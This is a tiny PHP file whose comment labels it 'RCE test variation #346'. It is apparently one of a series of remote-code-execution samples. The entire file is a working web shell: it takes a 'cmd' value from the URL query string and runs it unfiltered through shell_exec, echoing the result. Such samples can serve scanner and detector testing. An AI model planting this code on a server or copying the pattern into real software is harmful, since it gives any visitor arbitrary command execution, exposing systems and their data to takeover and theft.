<?php
// RCE test variation #346
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>